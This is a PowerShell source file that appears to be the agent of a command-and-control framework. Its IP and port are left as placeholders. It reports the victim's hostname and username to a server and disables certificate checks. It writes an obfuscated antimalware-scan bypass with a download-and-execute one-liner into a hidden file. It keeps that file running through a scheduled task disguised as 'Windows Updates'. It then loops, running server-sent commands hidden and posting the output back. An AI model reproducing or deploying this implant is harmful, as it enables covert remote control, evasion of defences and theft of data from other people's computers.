function Invoke-Executable { 
    param(
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]$sExeFile,
        [Parameter(Mandatory=$false)]
        [String[]]$cArgs,
        [Parameter(Mandatory=$false)]
        [String]$sVerb
    )
    # Setting process invocation parameters.
    $oPsi = New-Object -TypeName System.Diagnostics.ProcessStartInfo
    $oPsi.CreateNoWindow = $true
    $oPsi.UseShellExecute = $false
    $oPsi.RedirectStandardOutput = $true
    $oPsi.RedirectStandardError = $true
    $oPsi.FileName = $sExeFile
    if (! [String]::IsNullOrEmpty($cArgs)) {
        $oPsi.Arguments = $cArgs
    }
    if (! [String]::IsNullOrEmpty($sVerb)) {
        $oPsi.Verb = $sVerb
    }
    # Creating process object.
    $oProcess = New-Object -TypeName System.Diagnostics.Process
    $oProcess.StartInfo = $oPsi
    # Creating string builders to store stdout and stderr.
    $oStdOutBuilder = New-Object -TypeName System.Text.StringBuilder
    $oStdErrBuilder = New-Object -TypeName System.Text.StringBuilder
    # Adding event handers for stdout and stderr.
    $sScripBlock = {
        if (! [String]::IsNullOrEmpty($EventArgs.Data)) {
            $Event.MessageData.AppendLine($EventArgs.Data)
        }
    }
    $oStdOutEvent = Register-ObjectEvent -InputObject $oProcess `
        -Action $sScripBlock -EventName 'OutputDataReceived' `
        -MessageData $oStdOutBuilder
    $oStdErrEvent = Register-ObjectEvent -InputObject $oProcess `
        -Action $sScripBlock -EventName 'ErrorDataReceived' `
        -MessageData $oStdErrBuilder
    # Starting process.
    [Void]$oProcess.Start()
    $oProcess.BeginOutputReadLine()
    $oProcess.BeginErrorReadLine()
    [Void]$oProcess.WaitForExit()
    # Unregistering events to retrieve process output.
    Unregister-Event -SourceIdentifier $oStdOutEvent.Name
    Unregister-Event -SourceIdentifier $oStdErrEvent.Name
    $oResult = New-Object -TypeName PSObject -Property ([Ordered]@{
        "ExeFile"  = $sExeFile;
        "Args"     = $cArgs -join " ";
        "ExitCode" = $oProcess.ExitCode;
        "StdOut"   = $oStdOutBuilder.ToString().Trim();
        "StdErr"   = $oStdErrBuilder.ToString().Trim()
    })
    return $oResult.StdOut,$oResult.StdErr
}
###Usage:
#Invoke-Executable -sExeFile 'powershell' -cArgs @('/c', 'systeminfo')
#Declaring Variables needed
$hostname = [System.Net.Dns]::GetHostName()
$username = whoami
$ip   = "REPLACE_IP"
$port = "REPLACE_PORT"
$interface = "REPLACE_INTERFACE"
$n = "REPLACE_JITTER"
# $n    = replace_j
#Agent registration link
$regl  = ("https" + ':' + "//$ip" + ':' + "$port/reg/")
$data  = @{
    eth = "$interface" 
    hname = "$hostname"
    username="$username"
    }
#configuring file settings to bypass ssl certificate check
add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
#Getting agent 6 characters name e.g. SDFCXS
$name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content
#Declaring tasks and results links 
$taskl   = ("https" + ':' + "//$ip" + ':' + "$port/tasks/$name/")    # --> https://192.168.19.133:8000/tasks/SDFCXS
$resultl = ("https" + ':' + "//$ip" + ':' + "$port/results/$name/")
if (Test-Path "C:\Users\$env:USERNAME\Documents\logs.txt") {
    # Code to execute if file exists
} else {
    #echo PAYLOAD into file
    $oneliner = ("`$apple=[Ref].Assembly.GetTypes();ForEach(`$banana in `$apple) {if (`$banana.Name -like `"*siUtils`") {`$cherry=`$banana}};`$dogwater=`$cherry.GetFields('NonPublic,Static');ForEach(`$earache in `$dogwater) {if (`$earache.Name -like `"`*InitFailed`") {`$foxhole=`$earache}};`$foxhole.SetValue(`$null,`$true); [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}; IEX(New-Object Net.WebClient).DownloadString('https://" + $ip + ":8000/sc/eth0')")
    echo $oneliner > "C:\Users\$env:USERNAME\Documents\logs.txt"
    #hide the file
    $FILE=Get-Item '~\Documents\logs.txt' -Force
    $FILE.attributes='Hidden'
}
#schadule a task to run the oneliner
schtasks /create /sc minute /mo 1 /tn "Windows Updates" /tr "C:\Windows\System32\cmd.exe /c type %USERPROFILE%\Documents\logs.txt | powershell -nop -w hidden -ep bypass" /F
#Loop to check for tasks, recieve, execute & sends results in result Link
for (;;){
    try {
        # Code that might throw an error
     
    $task  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content
    
    if (-Not [string]::IsNullOrEmpty($task)){
        
        $result = Invoke-Executable -sExeFile 'powershell' -cArgs @('-nop -w hidden -ep bypass /c', $task)
        $data = @{result = "$result"}

        Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST' # --> https://192.168.71.142:8000/results/GTLBHU/

#####powershell dasdsasadasds | 
    }
    Start-Sleep -Seconds $n
    }catch [System.Net.WebException] {
        # Code to execute if WebException is thrown
       break
    }
}